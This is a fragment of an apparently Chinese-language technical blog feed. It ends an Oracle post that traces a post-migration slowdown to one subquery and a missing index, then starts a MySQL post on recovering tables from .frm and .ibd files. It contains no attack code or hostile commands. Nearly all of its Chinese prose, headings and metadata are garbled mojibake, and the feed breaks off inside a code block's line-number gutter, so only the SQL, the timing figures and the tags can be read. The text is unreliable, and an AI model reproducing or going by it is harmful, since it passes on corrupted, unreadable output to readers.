prj.ATT_DATE, 'yyyy-mm-dd' ), 'yyyymmdd' )= ifcl1Staus.COMPARE_DATE(+)</span><br><span class="line">AND prj.ATT_SCH_PK = levLeave.ATT_SCH_PK(+)</span><br><span class="line">AND prj.ATT_SCH_PK = levRtn.ATT_SCH_PK(+)</span><br><span class="line">AND prj.PRJ_CODE = wq.CODE(+)</span><br><span class="line">AND prj.EMP_PK = ifaceCount.EMP_PK(+)</span><br><span class="line">AND TO_CHAR( TO_DATE( prj.ATT_DATE, 'yyyy-mm-dd' ), 'yyyymmdd' )= ifaceCount.COMPARE_DATE(+)</span><br><span class="line">AND prj.EMP_PK = iface2.EMP_PK(+)</span><br><span class="line">AND TO_CHAR( TO_DATE( prj.sc_schedule_date, 'yyyy-mm-dd' ), 'yyyymmdd' )= iface2.COMPARE_DATE(+)</span><br><span class="line">ORDER BY</span><br><span class="line">APPLY_DATE DESC,</span><br><span class="line">ATTTYPE DESC</span><br></pre></td></tr></table></figure><h2 id="SQLä¼˜åŒ–æ€è·¯"><a href="#SQLä¼˜åŒ–æ€è·¯" class="headerlink" title="SQLä¼˜åŒ–æ€è·¯"></a>SQLä¼˜åŒ–æ€è·¯</h2><p>SQLè¯­å¥è¾ƒå¤æ‚ï¼Œ8ä¸ªå­æŸ¥è¯¢çš„left outer joinï¼Œæ¯ä¸ªå­æŸ¥è¯¢ä¸­åˆæœ‰è¿æ¥ã€‚æ€è·¯å¦‚ä¸‹ï¼š</p><ol><li>ä»å¤–å¾€å†…æ‹†åˆ†å­æŸ¥è¯¢</li><li>è€æ—§å¯¹æ¯”å­æŸ¥è¯¢æ‰§è¡Œè®¡åˆ’å’Œæ‰§è¡Œæ•ˆç‡</li><li>å­æŸ¥è¯¢è¿æ¥ä»1åˆ°2åˆ°3ä¸€ç›´åˆ°8ä¸ªè”æŸ¥å¯¹æ¯”ï¼Œå¯»æ‰¾ç“¶é¢ˆ</li></ol><h3 id="æ‹†åˆ†å­æŸ¥è¯¢"><a href="#æ‹†åˆ†å­æŸ¥è¯¢" class="headerlink" title="æ‹†åˆ†å­æŸ¥è¯¢"></a>æ‹†åˆ†å­æŸ¥è¯¢</h3><table><thead><tr><th>å­æŸ¥è¯¢</th><th>è€åº“ ï¼ˆç§’ï¼‰</th><th>æ–°åº“ï¼ˆç§’ï¼‰</th></tr></thead><tbody><tr><td>prj</td><td>1.182</td><td>0.318</td></tr><tr><td>ifcl1</td><td>14.229</td><td>13.168</td></tr><tr><td>ifclStatus</td><td>15.739</td><td>16.769</td></tr><tr><td>levLeave</td><td>10.147</td><td>9.813</td></tr><tr><td>levRtn</td><td>9.148</td><td>8.3</td></tr><tr><td>wq</td><td>0.141</td><td>0.165</td></tr><tr><td>ifcl1Count</td><td>3.498</td><td>1.966</td></tr><tr><td>iface2</td><td>49.255</td><td>50.897</td></tr></tbody></table><h3 id="å¯»æ‰¾ç“¶é¢ˆ"><a href="#å¯»æ‰¾ç“¶é¢ˆ" class="headerlink" title="å¯»æ‰¾ç“¶é¢ˆ"></a>å¯»æ‰¾ç“¶é¢ˆ</h3><table><thead><tr><th>è¿æ¥</th><th>è€åº“ï¼ˆç§’ï¼‰</th><th>æ–°åº“ï¼ˆç§’ï¼‰</th></tr></thead><tbody><tr><td>prj+ifcl1</td><td>1.522</td><td>1.129</td></tr><tr><td>+ifclStatus</td><td>2.343</td><td>1.957</td></tr><tr><td>+levLeave</td><td>2.525</td><td>1.955</td></tr><tr><td>+levRtn</td><td>2.658</td><td>1.653</td></tr><tr><td>+wq</td><td>2.561</td><td>1.999</td></tr><tr><td>+ifcl1Count</td><td>3.498</td><td>1.966</td></tr><tr><td>+iface2</td><td>11.124</td><td>383</td></tr></tbody></table><p>å‘ç°ç“¶é¢ˆå‡ºç°åœ¨<code>iface2</code></p><h2 id="ä¼˜åŒ–iface2"><a href="#ä¼˜åŒ–iface2" class="headerlink" title="ä¼˜åŒ–iface2"></a>ä¼˜åŒ–iface2</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">SELECT</span><br><span class="line">iface.EMP_PK,</span><br><span class="line">iface.COMPARE_DATE,</span><br><span class="line">wm_concat(</span><br><span class="line">(</span><br><span class="line">SELECT</span><br><span class="line">NVL( TRIM( T.PAR_VALUE ), TRIM( T.OLD_PAR_VALUE ))</span><br><span class="line">FROM</span><br><span class="line">(</span><br><span class="line">SELECT</span><br><span class="line">(</span><br><span class="line">SELECT</span><br><span class="line">PAR_VALUE</span><br><span class="line">FROM</span><br><span class="line">MD_SYS_PARM</span><br><span class="line">WHERE</span><br><span class="line">PAR_CODE = 'OLD_PIC_PATH'</span><br><span class="line">) AS OLD_PAR_VALUE,</span><br><span class="line">PAR_VALUE</span><br><span class="line">FROM</span><br><span class="line">MD_SYS_PARM</span><br><span class="line">WHERE</span><br><span class="line">PAR_CODE = 'ATT_COS_PATH'</span><br><span class="line">) T</span><br><span class="line">)|| REPLACE( SUBSTR( iface.COMPARE_MSG, INSTR( iface.COMPARE_MSG, 'compare', 1, 1 )), ']', '' )</span><br><span class="line">) AS FACE_ATT_IMG</span><br><span class="line">FROM</span><br><span class="line">(</span><br><span class="line">SELECT</span><br><span class="line">ifa.EMP_PK,</span><br><span class="line">ifa.COMPARE_DATE,</span><br><span class="line">ifa.COMPARE_MSG,</span><br><span class="line">RANK() OVER(</span><br><span class="line">PARTITION BY ifa.EMP_PK,</span><br><span class="line">ifa.COMPARE_DATE</span><br><span class="line">ORDER BY</span><br><span class="line">ifa.created DESC</span><br><span class="line">) rankno</span><br><span class="line">FROM</span><br><span class="line">IPG_FACE_COMPARE_LOG ifa</span><br><span class="line">WHERE</span><br><span class="line">ifa.HANDLE_TYPE = 0</span><br><span class="line">AND ifa.COMPARE_TYPE IN(</span><br><span class="line">'1',</span><br><span class="line">'3',</span><br><span class="line">'5'</span><br><span class="line">)</span><br><span class="line">AND INSTR( ifa.COMPARE_MSG, 'compare' )&gt; 0</span><br><span class="line">AND ifa.COMPARE_DATE &gt;= TO_CHAR( TO_DATE('2018-04-01', 'yyyy-mm-dd' ), 'yyyymmdd' )</span><br><span class="line">AND ifa.COMPARE_DATE &lt;= TO_CHAR( TO_DATE('2018-04-30', 'yyyy-mm-dd' ), 'yyyymmdd' )</span><br><span class="line">) iface</span><br><span class="line">WHERE</span><br><span class="line">iface.rankno &lt;= 3</span><br><span class="line">GROUP BY</span><br><span class="line">iface.EMP_PK,</span><br><span class="line">iface.COMPARE_DATE</span><br></pre></td></tr></table></figure><p><code>IPG_FACE_COMPARE_LOG</code>è¡¨ä¸­<code>COMPARE_DATEåˆ—</code>éœ€è¦æ–°å¢ç´¢å¼•ã€‚</p><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><ol><li>oracleå°ç‰ˆæœ¬ä¸åŒå¼•èµ·ä¼˜åŒ–å™¨æ— æ³•è·å–ç›¸åŒçš„æ‰§è¡Œè®¡åˆ’</li><li>ç´¢å¼•ç¼ºå¤±æ˜¯æœ¬æ¬¡çš„æ…¢æŸ¥è¯¢çš„ä¸»è¦åŸå› </li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;æ‘˜è¦ï¼šOracleæ•°æ®åº“åšäº†è¿ç§»ï¼Œä»åŸæ¥çš„DGè¿ç§»åˆ°æ–°åº“RACï¼Œå°ç‰ˆæœ¬ä¸åŒï¼›è€åº“ä¸­ç›¸åŒçš„SQLæ‰§è¡Œåªéœ€è¦11ç§’ï¼Œè€Œæ–°åº“éœ€è¦360ç§’ç”šè‡³800å¤šç§’ï¼Œå¦‚ä½•è¿›è¡Œå¤æ‚æŸ¥è¯¢çš„SQLä¼˜åŒ–ï¼Œæœ¬æ–‡æä¾›é€šç”¨çš„ä¸€ä¸ªæ€è·¯ã€‚&lt;/p&gt;
    
    </summary>
    
    
      <category term="æŠ€æœ¯å¹¿è§’" scheme="http://www.toberoot.com/categories/%E6%8A%80%E6%9C%AF%E5%B9%BF%E8%A7%92/"/>
    
      <category term="Oracle" scheme="http://www.toberoot.com/categories/%E6%8A%80%E6%9C%AF%E5%B9%BF%E8%A7%92/Oracle/"/>
    
    
      <category term="SQLä¼˜åŒ–" scheme="http://www.toberoot.com/tags/SQL%E4%BC%98%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>MySQLä¸€æ¬¡æƒŠå¿ƒåŠ¨é­„åœ°æ•°æ®å¼ºåˆ¶æ¢å¤</title>
    <link href="http://www.toberoot.com/2018/05/17/booboo_others/MySQL%E4%B8%80%E6%AC%A1%E6%83%8A%E5%BF%83%E5%8A%A8%E9%AD%84%E5%9C%B0%E6%95%B0%E6%8D%AE%E5%BC%BA%E5%88%B6%E6%81%A2%E5%A4%8D/"/>
    <id>http://www.toberoot.com/2018/05/17/booboo_others/MySQL%E4%B8%80%E6%AC%A1%E6%83%8A%E5%BF%83%E5%8A%A8%E9%AD%84%E5%9C%B0%E6%95%B0%E6%8D%AE%E5%BC%BA%E5%88%B6%E6%81%A2%E5%A4%8D/</id>
    <published>2018-05-16T19:58:02.000Z</published>
    <updated>2020-03-22T08:32:42.588Z</updated>
    
    <content type="html"><![CDATA[<p>æ‘˜è¦ï¼šCashæ¢å¤çš„æ­£ç¡®æ–¹å¼æ˜¯ï¼š<strong>å¤‡ä»½æ–‡ä»¶ï¼ˆé€»è¾‘æˆ–ç‰©ç†ï¼‰+ binlog</strong>è¿›è¡Œæ¢å¤ï¼›ç„¶è€Œå¹¶ä¸æ˜¯æ‰€æœ‰çš„è¿ç»´äººå‘˜éƒ½çŸ¥é“æ€ä¹ˆè¿›è¡Œæ­£ç¡®çš„å¤‡ä»½ï¼Œç”šè‡³è¿é€»è¾‘å¤‡ä»½å’Œç‰©ç†å¤‡ä»½çš„åŒºåˆ«æ˜¯ä»€ä¹ˆéƒ½ä¸çŸ¥é“ï¼Ÿæ›´ä¸çŸ¥é“å¤‡ä»½è¿‡ç¨‹ä¸­éœ€è¦è€ƒè™‘æ•°æ®çš„ä¸€è‡´æ€§ä¸æœåŠ¡å¯ç”¨æ€§çš„é—®é¢˜ï¼Ÿæˆ–è€…è¿å¤‡ä»½å·¥å…·éƒ½ä¸ä¼šä½¿ç”¨ï¼Œæ‰€ä»¥å½“ä½ é—®ï¼šæœ‰å¤‡ä»½å—ï¼Ÿå›ç­”ï¼šæ²¡æœ‰æˆ–è€…æ— æ•ˆ</p><p>åœ¨æœ¬æ¬¡æ¡ˆä¾‹ä¸­ï¼ŒæŸå®¢æˆ·æ•°æ®åº“å› å­˜å‚¨ç©ºé—´ä¸å¤Ÿå¯¼è‡´æ•°æ®åº“æœåŠ¡å®•æ‰ï¼Œè€Œå®¢æˆ·åœ¨æ•°æ®åº“å®•æœºåï¼Œåªæ‹·è´äº†å•ä¸ª<code>cy</code>åº“æ‰€å±çš„ç›®å½•è¿›è¡Œäº†æ–‡ä»¶å±‚é¢çš„å¤‡ä»½ï¼Œå°±å°†å…¶ä»–æ–‡ä»¶å…¨éƒ¨æ¸…ç©ºï¼Œå½“ä»–æƒ³é‡æ–°å¯åŠ¨æ•°æ®åº“æ—¶å‘ç°æ•°æ®åº“æœåŠ¡å¯åŠ¨ã€‚MySQLä½¿ç”¨5.7.17ç‰ˆæœ¬ï¼Œä½¿ç”¨innodbå­˜å‚¨å¼•æ“ï¼Œå¼€å¯äº†ç‹¬ç«‹è¡¨ç©ºé—´ã€‚ä¹Ÿå°±æ˜¯è¯´å½“å‰çš„æ•‘å‘½ç¨»è‰æ˜¯ï¼šæ¯ä¸ªè¡¨çš„<code>.frm</code>å’Œ<code>.ibd</code>æ–‡ä»¶ã€‚</p><a id="more"></a><h2 id="å†™åœ¨å‰é¢"><a href="#å†™åœ¨å‰é¢" class="headerlink" title="å†™åœ¨å‰é¢"></a>å†™åœ¨å‰é¢</h2><p>Cashæ¢å¤çš„æ­£ç¡®æ–¹å¼æ˜¯ï¼š<strong>å¤‡ä»½æ–‡ä»¶ï¼ˆé€»è¾‘æˆ–ç‰©ç†ï¼‰+ binlog</strong>è¿›è¡Œæ¢å¤ï¼›ç„¶è€Œå¹¶ä¸æ˜¯æ‰€æœ‰çš„è¿ç»´äººå‘˜éƒ½çŸ¥é“æ€ä¹ˆè¿›è¡Œæ­£ç¡®çš„å¤‡ä»½ï¼Œç”šè‡³è¿é€»è¾‘å¤‡ä»½å’Œç‰©ç†å¤‡ä»½çš„åŒºåˆ«æ˜¯ä»€ä¹ˆéƒ½ä¸çŸ¥é“ï¼Ÿæ›´ä¸çŸ¥é“å¤‡ä»½è¿‡ç¨‹ä¸­éœ€è¦è€ƒè™‘æ•°æ®çš„ä¸€è‡´æ€§ä¸æœåŠ¡å¯ç”¨æ€§çš„é—®é¢˜ï¼Ÿæˆ–è€…è¿å¤‡ä»½å·¥å…·éƒ½ä¸ä¼šä½¿ç”¨ï¼Œæ‰€ä»¥å½“ä½ é—®ï¼šæœ‰å¤‡ä»½å—ï¼Ÿå›ç­”ï¼šæ²¡æœ‰æˆ–è€…æ— æ•ˆ</p><p>åœ¨æœ¬æ¬¡æ¡ˆä¾‹ä¸­ï¼ŒæŸå®¢æˆ·åªå¯¹å•ä¸ª<code>cy</code>åº“æ‰€å±çš„ç›®å½•è¿›è¡Œäº†æ–‡ä»¶å±‚é¢çš„å¤‡ä»½ï¼ŒMySQLä½¿ç”¨5.7.17ç‰ˆæœ¬ï¼Œä½¿ç”¨innodbå­˜å‚¨å¼•æ“ï¼Œå¼€å¯äº†ç‹¬ç«‹è¡¨ç©ºé—´ã€‚ä¹Ÿå°±æ˜¯è¯´å½“å‰çš„æ•‘å‘½ç¨»è‰æ˜¯ï¼šæ¯ä¸ªè¡¨çš„<code>.frm</code>å’Œ<code>.ibd</code>æ–‡ä»¶ã€‚</p><h2 id="å¼ºåˆ¶è¿˜åŸæ­¥éª¤"><a href="#å¼ºåˆ¶è¿˜åŸæ­¥éª¤" class="headerlink" title="å¼ºåˆ¶è¿˜åŸæ­¥éª¤"></a>å¼ºåˆ¶è¿˜åŸæ­¥éª¤</h2><table><thead><tr><th>æ­¥éª¤</th><th>æè¿°</th><th>å¤‡æ³¨</th></tr></thead><tbody><tr><td>1</td><td><strong>åˆ›å»ºåŒç‰ˆæœ¬çš„MySQLæœåŠ¡å®ä¾‹ä¸€æš</strong></td><td></td></tr><tr><td>2</td><td><strong>è·å–è¡¨çš„åˆ—æ•°</strong></td><td>å¦‚æœæœ‰ddlå¤‡ä»½ç›´æ¥å¯¼å…¥ï¼Œå¯æƒœéƒ½æ˜¯æ²¡æœ‰çš„ï¼Œå“­ã€‚ã€‚ã€‚</td></tr><tr><td>2.1</td><td>åˆ›å»ºåŒåè¡¨ï¼Œç»“æ„æ— æ‰€è°“</td><td>æ•°æ®åº“çš„ä¸–ç•Œä¹Ÿéœ€è¦èº«ä»½è¯ï¼Œå…ˆé€ ä¸ªäººæ‹¿ä¸Šèº«ä»½è¯ï¼Œè‡³äºäººé•¿å¾—å•¥æ ·å‡ æ¡èƒ³è†Šéƒ½æ— æ‰€è°“ï¼Œåå­—æœ€é‡è¦</td></tr><tr><td>2.2</td><td>åœæœåŠ¡ï¼›ä½¿ç”¨å¤‡ä»½çš„frmæ–‡ä»¶è¦†ç›–å½“å‰çš„frm</td><td>å·æ¢æ¢æŸ±</td></tr><tr><td>2.3</td><td>é…ç½®æ–‡ä»¶æ·»åŠ å¼ºåˆ¶æ¢å¤innodbçš„å‚æ•°ï¼›å¯åŠ¨æœåŠ¡</td><td>è’™è”½å¥¹çš„åŒçœ¼</td></tr><tr><td>2.4</td><td>æŸ¥çœ‹è¡¨ç»“æ„</td><td>æ•°æ®åº“ä¼šæ‹¿ç€èº«ä»½è¯å’Œé¢å‰çš„äººï¼ˆfrmæ–‡ä»¶ï¼‰åšå¯¹æ¯”</td></tr><tr><td>2.5</td><td>æŸ¥çœ‹é”™è¯¯æ—¥å¿—ä¸­å…³äºè¯¥è¡¨çš„æŠ¥é”™</td><td>æ•°æ®åº“å‘ç°èº«ä»½è¯ä¸Šçš„äººåªæœ‰1æ¡èƒ³è†Šï¼Œè€Œè¢«æ£€æŸ¥çš„äººæœ‰10æ¡èƒ³è†Šï¼Œæ˜æ˜¾å¯¹ä¸ä¸Šå•Š</td></tr><tr><td>2.6</td><td>æˆåŠŸè·å–è¡¨çš„çœŸå®åˆ—æ•°ï¼›åˆ é™¤è¿™äº›è¡¨</td><td>é€šè¿‡è­¦å‘Šå¯ä»¥çŸ¥é“åº”è¯¥é€ ä¸€ä¸ªæœ‰10æ¡èƒ³è†Šçš„äºº</td></tr><tr><td>3</td><td><strong>è·å–è¡¨çš„ç»“æ„</strong></td><td></td></tr><tr><td>3.1</td><td>åˆ›å»ºåŒåè¡¨ï¼Œåˆ—æ•°ä¸€è‡´ï¼Œåˆ—åæ— æ‰€è°“</td><td>è¿™ä¸€æ¬¡é€ äººçš„æ—¶å€™ï¼Œé€ ä¸€ä¸ªæœ‰10æ¡èƒ³è†Šçš„ï¼Œæ¯æ¡èƒ³è†Šçš„åå­—æ— æ‰€è°“ï¼Œå…³é”®æ˜¯èº«ä»½è¯ä¸Šé¢çš„äººåå’Œ10æ¡èƒ³è†Š</td></tr><tr><td>3.2</td><td>åœæœåŠ¡ï¼›ä½¿ç”¨å¤‡ä»½çš„frmæ–‡ä»¶è¦†ç›–å½“å‰çš„frm</td><td>å·æ¢æ¢æŸ±</td></tr><tr><td>3.3</td><td>é…ç½®æ–‡ä»¶æ·»åŠ å¼ºåˆ¶æ¢å¤innodbçš„å‚æ•°ï¼›å¯åŠ¨æœåŠ¡</td><td>è’™è”½å¥¹çš„åŒçœ¼</td></tr><tr><td>3.4</td><td>æŸ¥çœ‹è¡¨ç»“æ„</td><td>æ•°æ®åº“ä¼šæ‹¿ç€æ–°çš„èº«ä»½è¯å’Œé¢å‰çš„äººï¼ˆfrmæ–‡ä»¶ï¼‰åšå¯¹æ¯”</td></tr><tr><td>3.5</td><td>æˆåŠŸè·å–è¡¨ç»“æ„</td><td>æ•°æ®åº“å‘ç°èº«ä»½è¯ä¸Šä¿¡æ¯å’Œè¢«æ£€æŸ¥çš„äººä¿¡æ¯ä¸€è‡´ï¼Œåå­—ï¼Œèƒ³è†Šçš„æ•°é‡ï¼Œå¯¹ä¸Šäº†å°±è®¤å¯å•¦ï¼ï¼ˆæ•°æ®åº“åªæ£€æŸ¥è¡¨åå’Œåˆ—çš„ä¸ªæ•°ï¼‰</td></tr><tr><td>4</td><td><strong>å¼ºåˆ¶æ¢å¤è¡¨æ•°æ®</strong></td><td></td></tr><tr><td>4.1</td><td>ä¸¢å¼ƒå½“å‰è¡¨çš„æ•°æ®</td><td>æŠŠè¿™ä¸ªäººçš„äº”è„å…­è…‘éƒ½æŒ–å‡ºæ¥</td></tr><tr><td>4.2</td><td>å°†å¤‡ä»½çš„ibdæ”¾åˆ°å¯¹åº”è·¯å¾„</td><td>å°†ä¹‹å‰å¤‡ä»½çš„åƒäº†è‚‰çš„äº”è„å…­è…‘æ”¾è¿›å»</td></tr><tr><td>4.3</td><td>å¯¼å…¥æ–°çš„æ•°æ®ï¼Œå¦‚æœæ•°æ®åº“åŠ è½½æˆåŠŸåˆ™å¯ä»¥çœ‹åˆ°æ•°æ®ï¼›å¦åˆ™åŠ è½½å¤±è´¥ã€‚</td><td>è·Ÿå¤§è„‘æ±‡æŠ¥ä¸€ä¸‹æ–°çš„äº”è„å…­è…‘å·²ç»å°±ä½å¯ä»¥å¼€å§‹ä½¿ç”¨äº†ï¼›å¦‚æœä½¿ç”¨å¾—æ²¡é—®é¢˜å°±æˆåŠŸï¼›å¦‚æœå™¨å®˜å·²ç»æŸåé‚£ä¹ˆæ‰‹æœ¯å¤±è´¥ã€‚</td></tr></tbody></table><h2 id="è¯¦ç»†è¿‡ç¨‹"><a href="#è¯¦ç»†è¿‡ç¨‹" class="headerlink" title="è¯¦ç»†è¿‡ç¨‹"></a>è¯¦ç»†è¿‡ç¨‹</h2><h3 id="æ•°æ®é‡"><a href="#æ•°æ®é‡" class="headerlink" title="æ•°æ®é‡"></a>æ•°æ®é‡</h3><table><thead><tr><th>æ˜ç»†</th><th>å¤§å°</th><th>å¤‡æ³¨</th></tr></thead><tbody><tr><td>ç‰©ç†æ–‡ä»¶</td><td>174M</td><td></td></tr><tr><td>æ•°æ®åº“</td><td>1ä¸ª</td><td>cy</td></tr><tr><td>è¡¨</td><td>57å¼ </td><td></td></tr></tbody></table><h3 id="æ¢å¤ç»“æœ"><a href="#æ¢å¤ç»“æœ" class="headerlink" title="æ¢å¤ç»“æœ"></a>æ¢å¤ç»“æœ</h3><blockquote><p>åœ¨å®¢æˆ·æœåŠ¡å™¨ä¸Šé¢ç»“æœå¦‚ä¸‹ï¼š</p></blockquote><table><thead><tr><th>æ˜ç»†</th><th>æˆåŠŸ</th><th>å¤±è´¥</th><th>æ¢å¤ç‡</th></tr></thead><tbody><tr><td>è¡¨ç»“æ„</td><td>58</td><td>0</td><td>100%</td></tr><tr><td>è¡¨æ•°æ®</td><td>56</td><td>2</td><td>96%</td></tr></tbody></table><blockquote><p>åœ¨æˆ‘çš„æœåŠ¡å™¨ä¸Šé¢ç»“æœå¦‚ä¸‹ï¼š</p></blockquote><table><thead><tr><th>æ˜ç»†</th><th>æˆåŠŸ</th><th>å¤±è´¥</th><th>æ¢å¤ç‡</th></tr></thead><tbody><tr><td>è¡¨ç»“æ„</td><td>58</td><td>0</td><td>100%</td></tr><tr><td>è¡¨æ•°æ®</td><td>58</td><td>0</td><td>100%</td></tr></tbody></table><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span 